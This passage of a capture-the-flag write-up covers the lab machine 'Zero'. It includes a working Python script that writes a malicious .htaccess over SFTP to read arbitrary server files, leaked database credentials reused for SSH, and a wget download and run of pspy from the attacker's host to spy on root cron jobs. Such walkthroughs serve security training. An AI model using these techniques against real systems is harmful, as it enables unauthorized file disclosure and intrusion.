+<p>I’ll make a Python script to read files from the server:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># /// script
+# requires-python = "&gt;=3.12"
+# dependencies = [
+#     "paramiko",
+#     "requests",
+# ]
+# ///
+</span><span class="kn">import</span> <span class="n">sys</span>
+<span class="kn">import</span> <span class="n">paramiko</span>
+<span class="kn">import</span> <span class="n">requests</span>
+
+
+<span class="k">if</span> <span class="nf">len</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">5</span><span class="p">:</span>
+    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">usage: </span><span class="si">{</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="si">}</span><span class="s"> &lt;host&gt; &lt;username&gt; &lt;password&gt; &lt;file to read&gt;</span><span class="sh">"</span><span class="p">)</span>
+    <span class="n">sys</span><span class="p">.</span><span class="nf">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+
+<span class="n">host</span><span class="p">,</span> <span class="n">username</span><span class="p">,</span> <span class="n">password</span><span class="p">,</span> <span class="n">target_file</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">:</span><span class="mi">5</span><span class="p">]</span>
+
+
+<span class="k">def</span> <span class="nf">write_file</span><span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">username</span><span class="p">,</span> <span class="n">password</span><span class="p">,</span> <span class="n">content</span><span class="p">):</span>
+    <span class="n">ssh_client</span> <span class="o">=</span> <span class="n">paramiko</span><span class="p">.</span><span class="nc">SSHClient</span><span class="p">()</span>
+    <span class="n">ssh_client</span><span class="p">.</span><span class="nf">set_missing_host_key_policy</span><span class="p">(</span><span class="n">paramiko</span><span class="p">.</span><span class="n">AutoAddPolicy</span><span class="p">)</span>
+    <span class="n">ssh_client</span><span class="p">.</span><span class="nf">connect</span><span class="p">(</span><span class="n">hostname</span><span class="o">=</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="o">=</span><span class="mi">22</span><span class="p">,</span> <span class="n">username</span><span class="o">=</span><span class="n">username</span><span class="p">,</span> <span class="n">password</span><span class="o">=</span><span class="n">password</span><span class="p">)</span>
+    <span class="n">sftp_client</span> <span class="o">=</span> <span class="n">ssh_client</span><span class="p">.</span><span class="nf">open_sftp</span><span class="p">()</span>
+    <span class="n">target_path</span> <span class="o">=</span> <span class="sh">"</span><span class="s">public_html/.htaccess</span><span class="sh">"</span>
+    <span class="n">sftp_client</span><span class="p">.</span><span class="nf">remove</span><span class="p">(</span><span class="n">target_path</span><span class="p">)</span>
+    <span class="k">with</span> <span class="n">sftp_client</span><span class="p">.</span><span class="nf">file</span><span class="p">(</span><span class="n">target_path</span><span class="p">,</span> <span class="sh">"</span><span class="s">wb</span><span class="sh">"</span><span class="p">)</span> <span class="k">as</span> <span class="n">remote_file</span><span class="p">:</span>
+        <span class="n">remote_file</span><span class="p">.</span><span class="nf">write</span><span class="p">(</span><span class="n">content</span><span class="p">)</span>
+
+
+<span class="k">def</span> <span class="nf">read_file</span><span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">username</span><span class="p">):</span>
+    <span class="n">resp</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">http://</span><span class="si">{</span><span class="n">host</span><span class="si">}</span><span class="s">/~</span><span class="si">{</span><span class="n">username</span><span class="si">}</span><span class="s">/0xdf.whatever</span><span class="sh">"</span><span class="p">)</span>
+    <span class="k">assert</span> <span class="n">resp</span><span class="p">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">404</span>
+    <span class="k">return</span> <span class="n">resp</span><span class="p">.</span><span class="n">text</span>
+
+
+<span class="n">htcontent</span> <span class="o">=</span> <span class="sa">f</span><span class="sh">"</span><span class="s">ErrorDocument 404 %{{file:</span><span class="si">{</span><span class="n">target_file</span><span class="si">}</span><span class="s">}}</span><span class="sh">"</span><span class="p">.</span><span class="nf">encode</span><span class="p">()</span>
+
+<span class="nf">write_file</span><span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">username</span><span class="p">,</span> <span class="n">password</span><span class="p">,</span> <span class="n">htcontent</span><span class="p">)</span>
+<span class="nf">print</span><span class="p">(</span><span class="nf">read_file</span><span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">username</span><span class="p">))</span>
+</code></pre></div></div>
+<p>The top metadata is added by <code class="language-plaintext highlighter-rouge">uv add --script read_file.py paramiko requests</code>, and then I can run with <code class="language-plaintext highlighter-rouge">uv run --script read_file.py</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>uv run <span class="nt">--script</span> read_file.py 
+<span class="go">usage: read_file.py &lt;host&gt; &lt;username&gt; &lt;password&gt; &lt;file to read&gt;
+</span></code></pre></div></div>
+<p>It works:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>uv run <span class="nt">--script</span> read_file.py zero.vl zro-de834d1c cbc6427b /etc/hosts
+<span class="go">127.0.0.1 localhost
+
+</span><span class="c"># The following lines are desirable for IPv6 capable hosts
+</span><span class="go">::1 ip6-localhost ip6-loopback
+fe00::0 ip6-localnet
+ff00::0 ip6-mcastprefix
+ff02::1 ip6-allnodes
+ff02::2 ip6-allrouters
+ff02::3 ip6-allhosts
+</span></code></pre></div></div>
+<h3 id="filesystem-enumeration">Filesystem Enumeration</h3>
+<p>With a bit of guessing, I can find the web directory in <code class="language-plaintext highlighter-rouge">/var/www/html</code>:</p>
+<div class="language-console code-collapse highlighter-rouge" data-trunc="300"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>uv run <span class="nt">--script</span> read_file.py zero.vl zro-de834d1c cbc6427b /var/www/html/index.php
+<span class="go">&lt;!doctype html&gt;
+&lt;html lang="en"&gt;
+  &lt;head&gt;
+    &lt;meta charset="utf-8"&gt;
+    &lt;meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"&gt;
+    &lt;meta name="description" content=""&gt;
+    &lt;meta name="author" content="Mark Otto, Jacob Thornton, and Bootstrap contributors"&gt;
+    &lt;meta name="generator" content="Jekyll v3.8.5"&gt;
+    &lt;title&gt;Zero&lt;/title&gt;
+
+    &lt;!-- Bootstrap core CSS --&gt;
+    &lt;link href="/dist/css/bootstrap.min.css" rel="stylesheet" crossorigin="anonymous"&gt;
+
+    &lt;style&gt;
+      .bd-placeholder-img { font-size: 1.125rem; text-anchor: middle; -webkit-user-select: none; -moz-user-select: none; -ms-user-select: none; user-select: none; }
+      @media (min-width: 768px) { .bd-placeholder-img-lg { font-size: 3.5rem; } }
+    &lt;/style&gt;
+    &lt;!-- Custom styles for this template --&gt;
+    &lt;link href="carousel.css" rel="stylesheet"&gt;
+  &lt;/head&gt;
+  &lt;body&gt;
+    &lt;header&gt;
+  &lt;nav class="navbar navbar-expand-md navbar-dark fixed-top bg-dark"&gt;
+    &lt;a class="navbar-brand" href="/index.php"&gt;Zero&lt;/a&gt;
+    &lt;button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarCollapse" aria-controls="navbarCollapse" aria-expanded="false" aria-label="Toggle navigation"&gt;
+      &lt;span class="navbar-toggler-icon"&gt;&lt;/span&gt;
+    &lt;/button&gt;
+    &lt;div class="collapse navbar-collapse" id="navbarCollapse"&gt;
+      &lt;ul class="navbar-nav mr-auto"&gt;
+        &lt;li class="nav-item active"&gt;&lt;a class="nav-link" href="/index.php"&gt;Home&lt;span class="sr-only"&gt;(current)&lt;/span&gt;&lt;/a&gt;&lt;/li&gt;
+        &lt;li class="nav-item"&gt;&lt;a class="nav-link" href="/stats.php"&gt;Statistics&lt;/a&gt;&lt;/li&gt;
+      &lt;/ul&gt;
+    &lt;/div&gt;
+  &lt;/nav&gt;
+&lt;/header&gt;
+
+&lt;main role="main"&gt;
+
+  &lt;div id="myCarousel" class="carousel slide" data-ride="carousel"&gt;
+    &lt;ol class="carousel-indicators"&gt;
+      &lt;li data-target="#myCarousel" data-slide-to="0" class="active"&gt;&lt;/li&gt;
+      &lt;li data-target="#myCarousel" data-slide-to="1"&gt;&lt;/li&gt;
+      &lt;li data-target="#myCarousel" data-slide-to="2"&gt;&lt;/li&gt;
+    &lt;/ol&gt;
+    &lt;div class="carousel-inner"&gt;
+      &lt;div class="carousel-item active"&gt;
+        &lt;img src="dist/img/ai-codes-coding-97077.jpg"&gt;
+        &lt;div class="container"&gt;
+          &lt;div class="carousel-caption text-left"&gt;
+            &lt;h1&gt;Zero&lt;/h1&gt;
+            &lt;p&gt;There is no place like Zero - your free home page hoster.&lt;/p&gt;
+            &lt;p&gt;&lt;a class="btn btn-lg btn-primary" href="/signup.php" role="button"&gt;Sign up today&lt;/a&gt;&lt;/p&gt;
+          &lt;/div&gt;
+        &lt;/div&gt;
+      &lt;/div&gt;
+    &lt;/div&gt;
+    &lt;a class="carousel-control-prev" href="#myCarousel" role="button" data-slide="prev"&gt;
+      &lt;span class="carousel-control-prev-icon" aria-hidden="true"&gt;&lt;/span&gt;
+      &lt;span class="sr-only"&gt;Previous&lt;/span&gt;
+    &lt;/a&gt;
+    &lt;a class="carousel-control-next" href="#myCarousel" role="button" data-slide="next"&gt;
+      &lt;span class="carousel-control-next-icon" aria-hidden="true"&gt;&lt;/span&gt;
+      &lt;span class="sr-only"&gt;Next&lt;/span&gt;
+    &lt;/a&gt;
+  &lt;/div&gt;
+
+
+  &lt;!-- Marketing messaging and featurettes
+  ================================================== --&gt;
+  &lt;!-- Wrap the rest of the page in another container to center all the content. --&gt;
+
+  &lt;div class="container marketing"&gt;
+
+    &lt;!-- START THE FEATURETTES --&gt;
+
+    &lt;div class="row featurette"&gt;
+      &lt;div class="col-md-7"&gt;
+        &lt;h2 class="featurette-heading"&gt;Secure SFTP Upload.&lt;span class="text-muted"&gt; WTF!&lt;/span&gt;&lt;/h2&gt;
+        &lt;p class="lead"&gt;We provide secure upload to your account using industry standard strong encryption algorithms. No one can spy on your password. No one will see what precious files you upload.&lt;/p&gt;
+      &lt;/div&gt;
+      &lt;div class="col-md-5"&gt;
+        &lt;img src="dist/img/cyber-security-cybersecurity-device-60504.jpg" width="400" height="400"&gt;&lt;title&gt;SSH&lt;/title&gt;
+      &lt;/div&gt;
+    &lt;/div&gt;
+
+    &lt;hr class="featurette-divider"&gt;
+
+    &lt;div class="row featurette"&gt;
+      &lt;div class="col-md-7 order-md-2"&gt;
+        &lt;h2 class="featurette-heading"&gt;Static file hosting.&lt;span class="text-muted"&gt; Retro!&lt;/span&gt;&lt;/h2&gt;
+        &lt;p class="lead"&gt;Like in the good old times! Fire up your Netscape Navigator 4.0 and browse your pages like in the last century! Use animated GIFs like in the 90s, upload Java applets for scrolling banners. Back to the roots!&lt;/p&gt;
+        &lt;p class="lead"&gt;Sounds cool? It does - we allow old-school static HTML pages.&lt;/p&gt;
+      &lt;/div&gt;
+      &lt;div class="col-md-5 order-md-1"&gt;
+        &lt;img src="dist/img/caffeine-coffee-cup-6347.jpg" width="400" height="400"&gt;&lt;title&gt;Coffee&lt;/title&gt;
+      &lt;/div&gt;
+    &lt;/div&gt;
+
+    &lt;hr class="featurette-divider"&gt;
+
+    &lt;!-- /END THE FEATURETTES --&gt;
+
+  &lt;/div&gt;&lt;!-- /.container --&gt;
+
+
+  &lt;!-- FOOTER --&gt;
+  &lt;footer class="container"&gt;
+    &lt;p class="float-right"&gt;&lt;a href="#"&gt;Back to top&lt;/a&gt;&lt;/p&gt;
+    &lt;p&gt;&amp;copy; 2022 Zero, Dec. &amp;middot; &lt;a href="#"&gt;Privacy&lt;/a&gt; &amp;middot; &lt;a href="#"&gt;Terms&lt;/a&gt; &amp;middot; &lt;a href="attribution.php"&gt;Attribution&lt;/a&gt;&lt;/p&gt;
+  &lt;/footer&gt;
+&lt;/main&gt;
+&lt;script src="https://code.jquery.com/jquery-3.3.1.slim.min.js" integrity="sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo" crossorigin="anonymous"&gt;&lt;/script&gt;
+      &lt;script&gt;window.jQuery || document.write('&lt;script src="/docs/4.3/assets/js/vendor/jquery-slim.min.js"&gt;&lt;\/script&gt;')&lt;/script&gt;&lt;script src="dist/js/bootstrap.bundle.min.js" crossorigin="anonymous"&gt;&lt;/script&gt;&lt;/body&gt;
+&lt;/html&gt;
+</span></code></pre></div></div>
+<p>Nothing interesting there. <code class="language-plaintext highlighter-rouge">signup.php</code> is just a static page. It does have this JavaScript:</p>
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;script&gt;</span>
+<span class="kd">function</span> <span class="nf">requestCreds</span><span class="p">()</span> <span class="p">{</span><span class="nb">document</span><span class="p">.</span><span class="nf">getElementById</span><span class="p">(</span><span class="dl">"</span><span class="s2">credsbutton</span><span class="dl">"</span><span class="p">).</span><span class="nx">disabled</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
+  <span class="kd">var</span> <span class="nx">xhttp</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">XMLHttpRequest</span><span class="p">();</span>
+  <span class="nx">xhttp</span><span class="p">.</span><span class="nx">onreadystatechange</span> <span class="o">=</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
+    <span class="k">if </span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="nx">readyState</span> <span class="o">==</span> <span class="mi">4</span> <span class="o">&amp;&amp;</span> <span class="k">this</span><span class="p">.</span><span class="nx">status</span> <span class="o">==</span> <span class="mi">200</span><span class="p">){</span>
+        <span class="nb">document</span><span class="p">.</span><span class="nf">getElementById</span><span class="p">(</span><span class="dl">"</span><span class="s2">creds</span><span class="dl">"</span><span class="p">).</span><span class="nx">innerHTML</span> <span class="o">=</span> <span class="k">this</span><span class="p">.</span><span class="nx">responseText</span><span class="p">;</span>
+    <span class="p">}</span>
+  <span class="p">};</span>
+  <span class="nx">xhttp</span><span class="p">.</span><span class="nf">open</span><span class="p">(</span><span class="dl">"</span><span class="s2">GET</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">/get-credentials-please-do-not-spam-this-thanks.php</span><span class="dl">"</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>                                                      
+  <span class="nx">xhttp</span><span class="p">.</span><span class="nf">send</span><span class="p">();</span>
+<span class="p">}</span>
+<span class="nt">&lt;/script&gt;</span>
+</code></pre></div></div>
+<p><code class="language-plaintext highlighter-rouge">/get-credentials-please-do-not-spam-this-thanks.php</code> has the code for creating a user:</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+<span class="nv">$username</span> <span class="o">=</span> <span class="s2">"zro-"</span> <span class="mf">.</span> <span class="nb">substr</span><span class="p">(</span><span class="nb">hash</span><span class="p">(</span><span class="s2">"sha256"</span><span class="p">,</span><span class="nb">rand</span><span class="p">()),</span><span class="mi">0</span><span class="p">,</span><span class="mi">8</span><span class="p">);</span>
+<span class="nv">$password</span> <span class="o">=</span> <span class="nb">substr</span><span class="p">(</span><span class="nb">hash</span><span class="p">(</span><span class="s2">"sha256"</span><span class="p">,</span><span class="nb">rand</span><span class="p">()),</span><span class="mi">0</span><span class="p">,</span><span class="mi">8</span><span class="p">);</span>
+<span class="nb">sleep</span><span class="p">(</span><span class="mi">15</span><span class="p">);</span> <span class="c1">// This is only here so that you do not create too many users :)</span>
+<span class="nb">header</span><span class="p">(</span><span class="s1">'X-Zero-Username: '</span> <span class="mf">.</span> <span class="nv">$username</span><span class="p">);</span>
+<span class="nb">header</span><span class="p">(</span><span class="s1">'X-Zero-Password: '</span> <span class="mf">.</span> <span class="nv">$password</span><span class="p">);</span>
+<span class="k">echo</span><span class="p">(</span><span class="s1">'&lt;p class="lead"&gt;Your personal account is ready to be used:&lt;br&gt;&lt;br&gt;Username: &lt;b&gt;'</span><span class="mf">.</span><span class="nv">$username</span><span class="mf">.</span><span class="s1">'&lt;/b&gt;&lt;br&gt;Password: &lt;b&gt;'</span><span class="mf">.</span><span class="nv">$password</span><span class="mf">.</span><span class="s1">'&lt;/b&gt;&lt;br&gt;&lt;br&gt;You can use the provided credentials to upload your pages via sftp://zero.vl. Your personal home page will be available &lt;a href="http://zero.vl/~'</span><span class="mf">.</span><span class="nv">$username</span><span class="mf">.</span><span class="s1">'"&gt;here&lt;/a&gt;.&lt;br&gt;&lt;br&gt;&lt;font size="-1"&gt;It may take up to one minute for all backend processes to properly identify you.&lt;/font&gt;&lt;/p&gt;'</span><span class="p">);</span>
+</code></pre></div></div>
+<p>This is interesting. It creates random username and password, but then just puts them in a header. It’s not clear where the user is actually created.</p>
+<p><code class="language-plaintext highlighter-rouge">stats.php</code> is mostly static, but the statistics themselves are generated with PHP:</p>
+<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;!doctype html&gt;</span>
+<span class="nt">&lt;html</span> <span class="na">lang=</span><span class="s">"en"</span><span class="nt">&gt;</span>
+...[snip]...
+        <span class="nt">&lt;h2</span> <span class="na">class=</span><span class="s">"featurette-heading"</span><span class="nt">&gt;</span>Statistics.<span class="nt">&lt;span</span> <span class="na">class=</span><span class="s">"text-muted"</span><span class="nt">&gt;</span> 1+1!<span class="nt">&lt;/span&gt;&lt;/h2&gt;</span>
+        <span class="err">&lt;</span>?php
+                $mysqli = new mysqli("localhost", "zroadmin", "correct-horse-battery-staple", "zro");
+                $result = $mysqli-&gt;query("SELECT * FROM stats LIMIT 1");
+                for ($row_no = $result-&gt;num_rows - 1; $row_no &gt;= 0; $row_no--) {
+                        $result-&gt;data_seek($row_no);
+                        $row = $result-&gt;fetch_assoc();
+                        print("<span class="nt">&lt;br&gt;</span>Registered users: <span class="nt">&lt;b&gt;</span>".$row['numuser']."<span class="nt">&lt;/b&gt;</span>
+                        <span class="nt">&lt;br&gt;</span>Number of pages hosted: <span class="nt">&lt;b&gt;</span>".$row['numpages']."<span class="nt">&lt;/b&gt;</span>
+                        <span class="nt">&lt;br&gt;</span>Number of open web sockets: <span class="nt">&lt;b&gt;</span>".$row['numsocks']."<span class="nt">&lt;/b&gt;</span>
+                        <span class="nt">&lt;br&gt;</span>System load average: <span class="nt">&lt;b&gt;</span>".$row['sysload']."<span class="nt">&lt;/b&gt;</span>
+                        <span class="nt">&lt;br&gt;</span>System uptime: <span class="nt">&lt;b&gt;</span>".$row['uptime']."<span class="nt">&lt;/b&gt;</span>
+                        <span class="nt">&lt;br&gt;</span>Number of admins logged in: <span class="nt">&lt;b&gt;</span>".$row['numadm']."<span class="nt">&lt;/b&gt;</span>");
+                }
+        ?&gt;
+        <span class="nt">&lt;p</span> <span class="na">class=</span><span class="s">"lead"</span><span class="nt">&gt;</span><span class="cp">&lt;?php include('stats.in.txt') ?&gt;</span><span class="nt">&lt;/p&gt;</span>
+...[snip]...
+<span class="nt">&lt;/html&gt;</span>
+</code></pre></div></div>
+<p>There’s no user input in the SQL query, so it isn’t a chance for SQL injection.</p>
+<p>There is a username and password for the database connection (as well as classic <a href="https://xkcd.com/936/">XKCD Easter egg</a>).</p>
+<h3 id="ssh-1">SSH</h3>
+<p>The creds work over SSH as well:</p>
+<div class="language-console sshpass-disclaimer highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>sshpass <span class="nt">-p</span> correct-horse-battery-staple ssh zroadmin@zero.vl
+<span class="go">Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.15.0-1084-aws x86_64)
+
+ System information as of Wed Aug  6 20:46:03 UTC 2025
+
+  System load:  0.08              Processes:             215
+  Usage of /:   57.3% of 5.05GB   Users logged in:       0
+  Memory usage: 7%                IPv4 address for eth0: 10.129.234.62
+  Swap usage:   0%
+
+  =&gt; There is 1 zombie process.
+</span><span class="gp">zroadmin@zero:~$</span><span class="w"> 
+</span></code></pre></div></div>
+<p>And I can claim <code class="language-plaintext highlighter-rouge">user.txt</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">zroadmin@zero:~$</span><span class="w"> </span><span class="nb">cat </span>user.txt
+<span class="go">296a8815************************
+</span></code></pre></div></div>
+<h2 id="shell-as-root">Shell as root</h2>
+<h3 id="enumeration">Enumeration</h3>
+<h4 id="users">Users</h4>
+<p>zroadmin can’t run <code class="language-plaintext highlighter-rouge">sudo</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">zroadmin@zero:~$</span><span class="w"> </span><span class="nb">sudo</span> <span class="nt">-l</span>
+<span class="go">[sudo] password for zroadmin: 
+Sorry, user zroadmin may not run sudo on zero.
+</span></code></pre></div></div>
+<p>Nothing interesting in zroadmin’s home directory:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">zroadmin@zero:~$</span><span class="w"> </span>find <span class="nb">.</span> <span class="nt">-type</span> f
+<span class="go">./.bashrc
+./.cache/motd.legal-displayed
+./.bash_logout
+./user.txt
+./.profile
+</span></code></pre></div></div>
+<p>There are two other users with home directories in <code class="language-plaintext highlighter-rouge">/home</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">zroadmin@zero:/home$</span><span class="w"> </span><span class="nb">ls</span>
+<span class="go">ubuntu  zro-de834d1c  zroadmin
+</span></code></pre></div></div>
+<p>ubuntu has a shell in <code class="language-plaintext highlighter-rouge">passwd</code> as well:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">zroadmin@zero:/home$</span><span class="w"> </span><span class="nb">cat</span> /etc/passwd | <span class="nb">grep</span> <span class="s1">'sh$'</span>
+<span class="go">root:x:0:0:root:/root:/bin/bash
+ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
+zroadmin:x:666:666::/home/zroadmin:/bin/bash
+</span></code></pre></div></div>
+<p>zro-de834d1c doesn’t, but that’s the user created for the web. zroadmin can access it:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">zroadmin@zero:/home/zro-de834d1c$</span><span class="w"> </span><span class="nb">ls</span>
+<span class="go">public_html
+</span><span class="gp">zroadmin@zero:/home/zro-de834d1c$</span><span class="w"> </span>find <span class="nb">.</span> <span class="nt">-type</span> f
+<span class="go">./public_html/test.inc
+./public_html/test.phps
+./public_html/.htaccess
+./public_html/test.php4
+./public_html/test.php6
+./public_html/htaccess
+./public_html/test.php3
+./public_html/.htaccess.bk
+./public_html/test.php
+./public_html/index.html
+./public_html/test.php5
+</span></code></pre></div></div>
+<p>Nothing I didn’t create.</p>
+<p>zroadmin can’t access ubuntu.</p>
+<h4 id="web">Web</h4>
+<p>There’s nothing new in the web directory beyond the files I already found:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">zroadmin@zero:/var/www/html$</span><span class="w"> </span><span class="nb">ls</span>
+<span class="go">attribution.php  dist                                                images.txt  index.php  signup.php
+carousel.css     get-credentials-please-do-not-spam-this-thanks.php  index.html  info.php   stats.php
+</span></code></pre></div></div>
+<p>The Apache config for the site is as expected, except that it is logging the <code class="language-plaintext highlighter-rouge">X-Zero-Username</code> and <code class="language-plaintext highlighter-rouge">X-Zero-Password</code> to a file named <code class="language-plaintext highlighter-rouge">accounts</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">zroadmin@zero:/etc/apache2/sites-enabled$ </span><span class="nb">cat </span>000-default.conf | <span class="nb">grep</span> <span class="nt">-vP</span> <span class="s1">'^\s#'</span> | <span class="nb">grep</span> <span class="nb">.</span>
+<span class="go">&lt;VirtualHost *:80&gt;
+        ServerAdmin webmaster@zero.vl
+        DocumentRoot /var/www/html
+        LogFormat "%{X-Zero-Username}o %{X-Zero-Password}o" accounts
+        CustomLog ${APACHE_LOG_DIR}/accounts.log accounts
+&lt;/VirtualHost&gt;
+</span><span class="c"># vim: syntax=apache ts=4 sw=4 sts=4 sr noet
+</span></code></pre></div></div>
+<p>The <code class="language-plaintext highlighter-rouge">o</code> after the header name variables is for outgoing headers, so that file must be what is being watched and used to make new users. It’s going to be in <code class="language-plaintext highlighter-rouge">/var/log/apache2</code>, which I can’t access at this point.</p>
+<h4 id="processes">Processes</h4>
+<p>Nothing really jumps out as interesting on the process list (<code class="language-plaintext highlighter-rouge">ps auxww</code>), so I’ll grab a copy of <a href="https://github.com/DominicBreuker/pspy">pspy</a> and host it on my Python webserver, uploading it to Zero using <code class="language-plaintext highlighter-rouge">wget</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">zroadmin@zero:/dev/shm$</span><span class="w"> </span>wget 10.10.14.79/pspy64
+<span class="go">--2025-08-06 21:22:44--  http://10.10.14.79/pspy64
+Connecting to 10.10.14.79:80... connected.      
+HTTP request sent, awaiting response... 200 OK
+Length: 3104768 (3.0M) [application/octet-stream]
+Saving to: ‘pspy64’
+
+pspy64                            100%[============================&gt;]   2.96M  4.46MB/s    in 0.7s    c
+
+2025-08-06 21:22:45 (4.46 MB/s) - ‘pspy64’ saved [3104768/3104768]
+</span></code></pre></div></div>
+<p>I’ll make it executable and run it:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">zroadmin@zero:/dev/shm$</span><span class="w"> </span><span class="nb">chmod</span> +x pspy64
+<span class="gp">zroadmin@zero:/dev/shm$</span><span class="w"> </span>./pspy64
+<span class="go">pspy - version: v1.2.1 - Commit SHA: f9e6a1590a4312b9faa093d8dc84e19567977a6d
+...[snip]...
+</span></code></pre></div></div>
+<p>Every minute, there are crons that trigger:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">2025/08/07 01:12:01 CMD: UID=0     PID=36191  | /usr/bin/bash /usr/local/bin/zro.web-confcheck 
+2025/08/07 01:12:01 CMD: UID=0     PID=36192  | /usr/bin/bash /usr/local/bin/zro.web-confcheck 
+2025/08/07 01:12:01 CMD: UID=0     PID=36193  | /usr/bin/bash /usr/local/bin/zro.web-confcheck 
+2025/08/07 01:12:01 CMD: UID=0     PID=36194  | (snap) 
+2025/08/07 01:12:01 CMD: UID=0     PID=36199  | /usr/bin/snap run amazon-ssm-agent 
+2025/08/07 01:12:01 CMD: UID=0     PID=36213  | /usr/sbin/CRON -f 
+2025/08/07 01:12:01 CMD: UID=0     PID=36212  | /usr/sbin/cron -f 
+2025/08/07 01:12:01 CMD: UID=0     PID=36211  | /usr/sbin/CRON -f 
+2025/08/07 01:12:01 CMD: UID=0     PID=36214  | /usr/sbin/CRON -f 
+2025/08/07 01:12:01 CMD: UID=0     PID=36215  | /bin/bash /root/bin/create-account.sh 
+2025/08/07 01:12:01 CMD: UID=0     PID=36216  | /usr/sbin/CRON -f 
+2025/08/07 01:12:01 CMD: UID=0     PID=36217  | /bin/bash /root/bin/create-account.sh 
+2025/08/07 01:12:01 CMD: UID=0     PID=36218  | /bin/bash /root/bin/create-account.sh 
+2025/08/07 01:12:01 CMD: UID=0     PID=36220  | /bin/bash /root/bin/create-account.sh 
+2025/08/07 01:12:01 CMD: UID=0     PID=36219  | 
+2025/08/07 01:12:01 CMD: UID=0     PID=36222  | /usr/sbin/CRON -f 
+2025/08/07 01:12:01 CMD: UID=0     PID=36221  | /usr/bin/python3 /root/bin/cleanup.py 
+2025/08/07 01:12:01 CMD: UID=0     PID=36223  | /bin/bash /root/bin/update-stats.sh 
+2025/08/07 01:12:01 CMD: UID=0     PID=36224  | /bin/bash /root/bin/update-stats.sh 
+2025/08/07 01:12:01 CMD: UID=0     PID=36225  | /bin/bash /root/bin/update-stats.sh 
+2025/08/07 01:12:01 CMD: UID=0     PID=36227  | /usr/bin/wc -l 
+2025/08/07 01:12:01 CMD: UID=0     PID=36226  | /usr/bin/find -P /home/zro-17fd6687/public_html /home/zro-1ff46dde/public_html /home/zro-516f1d47/public_html /home/zro-de834d1c/public_html -type f 
+2025/08/07 01:12:01 CMD: UID=0     PID=36230  | /bin/bash /root/bin/update-stats.sh 
+2025/08/07 01:12:01 CMD: UID=0     PID=36229  | /bin/ss -nt state established src :80 
+2025/08/07 01:12:01 CMD: UID=0     PID=36228  | /bin/bash /root/bin/update-stats.sh 
+2025/08/07 01:12:01 CMD: UID=0     PID=36232  | /bin/bash /root/bin/update-stats.sh 
+2025/08/07 01:12:01 CMD: UID=0     PID=36231  | /bin/bash /root/bin/update-stats.sh 
+2025/08/07 01:12:01 CMD: UID=0     PID=36233  | 
+2025/08/07 01:12:02 CMD: UID=0     PID=36235  | /bin/bash /root/bin/update-stats.sh 
+2025/08/07 01:12:02 CMD: UID=0     PID=36237  | /bin/sed -e s:.*,\(.*\) user.*:\1: 
+2025/08/07 01:12:02 CMD: UID=0     PID=36236  | /bin/bash /root/bin/update-stats.sh 
+2025/08/07 01:12:02 CMD: UID=0     PID=36239  | /bin/bash /root/bin/update-stats.sh 
+2025/08/07 01:12:02 CMD: UID=0     PID=36238  | /bin/bash /root/bin/update-stats.sh 
+2025/08/07 01:12:02 CMD: UID=0     PID=36240  | 
